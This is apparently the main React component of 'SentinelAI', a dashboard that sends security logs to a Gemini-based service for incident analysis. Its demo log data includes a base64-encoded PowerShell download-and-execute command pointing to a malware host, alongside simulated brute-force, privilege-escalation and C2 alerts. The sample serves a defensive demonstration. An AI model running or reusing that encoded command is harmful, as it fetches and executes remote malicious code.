
import React, { useState, useRef } from 'react';
import { analyzeIncident } from './services/geminiService';
import { IncidentRecord, AnalysisState, IncidentAnalysis } from './types';
import { IncidentDisplay } from './components/IncidentDisplay';
import { PieChart, Pie, Cell, ResponsiveContainer, Tooltip } from 'recharts';

const DEMO_LOGS = `2024-10-12T14:22:01Z [SEC_AUTH] ALERT: Multiple failed login attempts (45) for user 'svc_deploy' from source 185.191.171.42 (Location: RU)
2024-10-12T14:25:33Z [SEC_AUTH] SUCCESS: Login for user 'svc_deploy' from source 185.191.171.42
2024-10-12T14:28:10Z [EDR_PROT] DETECT: Suspicious PowerShell execution on SRV-APP-04 (10.0.4.12)
Command: powershell.exe -e SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vY2MtY2VudHJhbC5pby9tYWx3YXJlLnBzMScp
2024-10-12T14:30:45Z [FW_TRUST] BLOCK: Outbound connection attempt from 10.0.4.12 to 91.240.118.4 (Threat_Intelligence_Match: CobaltStrike_C2)
2024-10-12T14:32:12Z [AD_AUDIT] ALERT: User 'svc_deploy' added to 'Domain Admins' group on DC-01 by SRV-APP-04`;

const App: React.FC = () => {
  const [input, setInput] = useState('');
  const [image, setImage] = useState<string | null>(null);
  const [state, setState] = useState<AnalysisState>(AnalysisState.IDLE);
  const [currentAnalysis, setCurrentAnalysis] = useState<IncidentAnalysis | null>(null);
  const [history, setHistory] = useState<IncidentRecord[]>([]);
  const [error, setError] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setImage(reader.result as string);
        setError(null);
      };
      reader.readAsDataURL(file);
    }
  };

  const loadDemo = () => {
    setInput(DEMO_LOGS);
    setImage(null);
    setCurrentAnalysis(null);
    setState(AnalysisState.IDLE);
    setError(null);
  };

  const handleAnalyze = async () => {
    if (!input.trim() && !image) return;
    
    setState(AnalysisState.LOADING);
    setError(null);
    
    try {
      const result = await analyzeIncident(input, image || undefined);
      setCurrentAnalysis(result);
      
      const newRecord: IncidentRecord = {
        id: Math.random().toString(36).substr(2, 9),
        timestamp: new Date().toLocaleTimeString(),
        rawInput: input,
        imagePreview: image || undefined,
        analysis: result,
        status: 'analyzed'
      };
      
      setHistory(prev => [newRecord, ...prev]);
      setState(AnalysisState.SUCCESS);
    } catch (err) {
      console.error(err);
      setError('Analysis failed. Check API key and ensure image is a valid format (PNG/JPEG).');
      setState(AnalysisState.ERROR);
    }
  };

  const clearSession = () => {
    setInput('');
    setImage(null);
    setCurrentAnalysis(null);
    setState(AnalysisState.IDLE);
    setError(null);
  };

  // Helper to ensure counts are always accurate regardless of chart rendering
  const getSeverityCount = (severity: string) => history.filter(h => h.analysis?.severity === severity).length;

  const stats = [
    { name: 'Critical', value: getSeverityCount('Critical'), color: '#ef4444' }, // Red-500
    { name: 'High', value: getSeverityCount('High'), color: '#f97316' },     // Orange-500
    { name: 'Medium', value: getSeverityCount('Medium'), color: '#eab308' }, // Yellow-500
    { name: 'Low', value: getSeverityCount('Low'), color: '#3b82f6' },       // Blue-500
  ];

  // For the Pie Chart, we filter out zero values to avoid rendering empty segments
  const chartData = stats.filter(s => s.value > 0);

  return (
    <div className="min-h-screen bg-slate-950 flex flex-col selection:bg-blue-500/30">
      <header className="border-b border-white/5 bg-slate-900/60 backdrop-blur-xl sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <div className="relative">
               <div className="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center shadow-[0_0_20px_rgba(37,99,235,0.4)]">
                 <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
               </div>
               <div className="absolute -top-1 -right-1 w-3 h-3 bg-green-500 border-2 border-slate-900 rounded-full"></div>
            </div>
            <div>
              <h1 className="text-xl font-black tracking-tighter text-white">SENTINEL<span className="text-blue-500">AI</span></h1>
              <p className="text-[9px] text-slate-500 font-mono font-bold uppercase tracking-[0.2em]">Quantum-Ready Command Node</p>
            </div>
          </div>
          
          <div className="flex items-center gap-4">
            <button onClick={clearSession} className="text-[10px] font-bold uppercase tracking-widest text-slate-500 hover:text-white transition-colors">
              Flush Session
            </button>
            <div className="h-4 w-[1px] bg-slate-800"></div>
            <div className="hidden sm:block text-right">
              <div className="text-[9px] text-slate-600 font-bold uppercase">Active Nodes</div>
              <div className="text-[10px] font-mono text-green-500">G-FLASH-3-PREVIEW</div>
            </div>
          </div>
        </div>
      </header>

      <main className="flex-1 max-w-7xl mx-auto w-full p-4 md:p-8 grid grid-cols-1 lg:grid-cols-12 gap-8">
        <aside className="lg:col-span-3 space-y-6">
          <div className="bg-slate-900/50 border border-slate-800 rounded-2xl p-6 shadow-xl backdrop-blur-sm flex flex-col">
            <h3 className="text-[10px] font-bold text-slate-500 uppercase mb-6 tracking-[0.2em] border-l-2 border-blue-500 pl-3">Risk Pulse</h3>
            
            <div className="space-y-6">
              <div className="h-40 relative flex items-center justify-center">
                {history.length > 0 ? (
                  <>
                    <ResponsiveContainer width="100%" height="100%">
                      <PieChart>
                        <Pie data={chartData} innerRadius={50} outerRadius={70} paddingAngle={4} dataKey="value" stroke="none">
                          {chartData.map((entry, index) => <Cell key={`cell-${index}`} fill={entry.color} />)}
                        </Pie>
                        <Tooltip 
                          contentStyle={{ backgroundColor: '#0f172a', border: '1px solid #334155', borderRadius: '8px', fontSize: '12px' }}
                          itemStyle={{ color: '#f8fafc' }}
                        />
                      </PieChart>
                    </ResponsiveContainer>
                    <div className="absolute inset-0 flex flex-col items-center justify-center pointer-events-none">
                      <span className="text-2xl font-black text-white">{history.length}</span>
                      <span className="text-[8px] text-slate-500 font-bold uppercase">Events</span>
                    </div>
                  </>
                ) : (
                  <div className="text-slate-700 text-[10px] text-center italic w-full border border-dashed border-slate-800 rounded-full h-32 flex items-center justify-center">
                    No Telemetry Data
                  </div>
                )}
              </div>

              {/* Risk Breakdown Legend */}
              <div className="space-y-2 pt-2 border-t border-slate-800/50">
                {stats.map((stat) => (
                  <div key={stat.name} className="flex justify-between items-center text-xs p-1 hover:bg-slate-800/30 rounded transition-colors group">
                    <div className="flex items-center gap-2 text-slate-400 group-hover:text-slate-200 transition-colors">
                      <span className="w-2 h-2 rounded-full shadow-[0_0_8px]" style={{ backgroundColor: stat.color, boxShadow: `0 0 8px ${stat.color}80` }}></span>
                      {stat.name}
                    </div>
                    <span className="font-mono font-bold" style={{ color: stat.color }}>
                      {stat.value}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          </div>

          <div className="bg-slate-900/50 border border-slate-800 rounded-2xl p-6 flex-1 shadow-xl flex flex-col min-h-[300px]">
            <h3 className="text-[10px] font-bold text-slate-500 uppercase mb-4 tracking-[0.2em] border-l-2 border-slate-700 pl-3">Log History</h3>
            <div className="space-y-3 overflow-y-auto flex-1 pr-2 scrollbar-thin scrollbar-thumb-slate-800 h-64">
              {history.length > 0 ? history.map((record) => (
                <button 
                  key={record.id} 
                  onClick={() => { setCurrentAnalysis(record.analysis || null); setInput(record.rawInput); setState(AnalysisState.SUCCESS); setImage(record.imagePreview || null); }}
                  className="w-full text-left p-4 bg-slate-950/50 rounded-xl border border-slate-800/50 hover:border-blue-500/50 transition-all group"
                >
                  <div className="flex justify-between items-center mb-2">
                    <span className="text-[9px] text-slate-600 font-mono font-bold tracking-tighter">{record.timestamp}</span>
                    {record.analysis && <span className={`w-2 h-2 rounded-full shadow-[0_0_8px] ${
                      record.analysis.severity === 'Critical' ? 'bg-red-500 shadow-red-500/50' :
                      record.analysis.severity === 'High' ? 'bg-orange-500 shadow-orange-500/50' : 
                      record.analysis.severity === 'Medium' ? 'bg-yellow-500 shadow-yellow-500/50' : 'bg-blue-500 shadow-blue-500/50'
                    }`}></span>}
                  </div>
                  <p className="text-[11px] text-slate-400 line-clamp-2 mono group-hover:text-slate-200 transition-colors leading-relaxed">{record.rawInput || "Visual Evidence Only"}</p>
                </button>
              )) : (
                <div className="text-slate-700 text-[10px] text-center mt-20 font-mono">HISTORY_VOID</div>
              )}
            </div>
          </div>
        </aside>

        <section className="lg:col-span-9 space-y-8">
          <div className="bg-slate-900/50 border border-slate-800 rounded-2xl shadow-2xl overflow-hidden backdrop-blur-md">
            <div className="px-6 py-4 bg-slate-800/30 border-b border-white/5 flex justify-between items-center">
              <span className="text-[10px] font-black text-slate-400 tracking-[0.2em] flex items-center gap-3 uppercase">
                <span className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></span>
                Inference Ingestion Engine
              </span>
              <div className="flex gap-4 items-center">
                <button 
                  onClick={loadDemo}
                  className="text-[10px] font-bold uppercase tracking-widest text-blue-400 hover:text-blue-300 transition-colors border border-blue-400/20 px-2 py-1 rounded bg-blue-400/5"
                >
                  Load Demo Incident
                </button>
                <div className="h-3 w-[1px] bg-slate-700"></div>
                <input type="file" ref={fileInputRef} onChange={handleFileUpload} accept="image/*" className="hidden" />
                <button 
                  onClick={() => fileInputRef.current?.click()}
                  className={`text-[10px] font-bold uppercase tracking-widest transition-colors ${image ? 'text-blue-400' : 'text-slate-500 hover:text-slate-300'}`}
                >
                  {image ? 'Visual Evidence ✓' : 'Add Visual Evidence'}
                </button>
              </div>
            </div>
            <div className="p-6">
              <div className="relative group">
                <textarea 
                  value={input}
                  onChange={(e) => setInput(e.target.value)}
                  placeholder="Paste multi-line telemetry logs, SIEM JSON alerts, or architectural descriptions (Optional if image provided)..."
                  className="w-full h-44 bg-slate-950/80 text-blue-100 p-6 rounded-2xl font-mono text-sm border border-slate-800 focus:outline-none focus:border-blue-500/50 focus:ring-0 transition-all resize-none shadow-inner"
                />
                {image && (
                  <div className="absolute bottom-4 right-4 w-32 h-20 rounded-lg border border-white/10 overflow-hidden shadow-2xl animate-in zoom-in-95 duration-200">
                    <img src={image} className="w-full h-full object-cover" alt="Evidence" />
                    <button onClick={() => setImage(null)} className="absolute top-1 right-1 p-1 bg-black/50 text-white rounded-full hover:bg-red-500 transition-colors">
                      <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                    </button>
                  </div>
                )}
              </div>
              <div className="flex flex-col sm:flex-row justify-between items-center mt-6 gap-4">
                <div className="flex items-center gap-6">
                  <div className="flex flex-col">
                    <span className="text-[8px] text-slate-600 font-bold uppercase tracking-widest mb-1">Payload Readiness</span>
                    <div className="flex gap-2">
                       <span className={`text-[9px] font-mono font-bold px-1.5 py-0.5 rounded ${input.trim() ? 'bg-blue-500/20 text-blue-400' : 'bg-slate-800 text-slate-600'}`}>LOGS: {input.trim() ? 'OK' : 'MISSING'}</span>
                       <span className={`text-[9px] font-mono font-bold px-1.5 py-0.5 rounded ${image ? 'bg-purple-500/20 text-purple-400' : 'bg-slate-800 text-slate-600'}`}>VISUALS: {image ? 'OK' : 'MISSING'}</span>
                    </div>
                  </div>
                  <div className="w-[1px] h-6 bg-slate-800"></div>
                  <div className="flex flex-col">
                    <span className="text-[8px] text-slate-600 font-bold uppercase tracking-widest mb-1">Framework</span>
                    <span className="text-[10px] text-slate-400 font-mono font-bold">NIST_800_61R2</span>
                  </div>
                </div>
                <button 
                  onClick={handleAnalyze}
                  disabled={state === AnalysisState.LOADING || (!input.trim() && !image)}
                  className={`px-10 py-3.5 rounded-xl font-black text-xs uppercase tracking-[0.2em] flex items-center gap-3 transition-all ${
                    state === AnalysisState.LOADING 
                      ? 'bg-slate-800 text-slate-600 cursor-not-allowed border border-slate-700' 
                      : 'bg-blue-600 hover:bg-blue-500 text-white shadow-[0_0_30px_rgba(37,99,235,0.3)] hover:shadow-[0_0_40px_rgba(37,99,235,0.5)] active:scale-95 border border-blue-400/20'
                  }`}
                >
                  {state === AnalysisState.LOADING ? 'PROCESSSING_INFERENCE...' : 'RUN_COMMAND_LEVEL_ANALYSIS'}
                </button>
              </div>
            </div>
          </div>

          {error && (
            <div className="bg-red-900/10 border border-red-900/30 p-5 rounded-2xl flex items-center gap-4 text-red-400 animate-in slide-in-from-top-4">
              <div className="w-10 h-10 bg-red-900/20 rounded-lg flex items-center justify-center border border-red-500/30">
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
              </div>
              <div>
                <h4 className="text-xs font-bold uppercase tracking-widest">System Error Encountered</h4>
                <p className="text-[11px] opacity-80">{error}</p>
              </div>
            </div>
          )}

          {currentAnalysis ? (
            <div className="bg-slate-900/40 border border-slate-800 rounded-2xl p-8 shadow-2xl relative animate-in fade-in zoom-in-95 duration-500">
               <IncidentDisplay analysis={currentAnalysis} />
            </div>
          ) : state !== AnalysisState.LOADING && (
            <div className="h-96 flex flex-col items-center justify-center border-2 border-dashed border-slate-900 rounded-2xl bg-slate-950/20 group">
              <div className="w-20 h-20 bg-slate-900/50 rounded-full flex items-center justify-center mb-6 group-hover:scale-110 transition-transform duration-500 border border-white/5">
                <svg className="w-8 h-8 text-slate-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
              </div>
              <p className="text-xs font-bold text-slate-600 uppercase tracking-[0.3em]">Command Terminal Inactive</p>
              <p className="text-[10px] text-slate-800 mt-2 font-mono italic">AWAITING_INPUT_SIGNAL</p>
            </div>
          )}
        </section>
      </main>

      <footer className="border-t border-white/5 bg-slate-950 py-8 px-4">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6">
          <div className="flex items-center gap-4 opacity-30">
            <div className="h-0.5 w-12 bg-slate-800"></div>
            <span className="text-[8px] font-mono tracking-widest text-slate-400">SENTINEL_NODE_V2.5.4</span>
            <div className="h-0.5 w-12 bg-slate-800"></div>
          </div>
          <div className="flex gap-10 items-center">
            <div className="flex flex-col items-end">
              <span className="text-[8px] text-slate-700 font-bold uppercase mb-1">Cyber-Range Protocol</span>
              <span className="text-[10px] text-slate-500 font-mono">TLS_1.3_CHACHA20_POLY1305</span>
            </div>
            <div className="w-[1px] h-8 bg-slate-900"></div>
            <div className="flex flex-col items-end">
              <span className="text-[8px] text-slate-700 font-bold uppercase mb-1">Current Coordinates</span>
              <span className="text-[10px] text-blue-900 font-mono">37.7749N / 122.4194W</span>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default App;
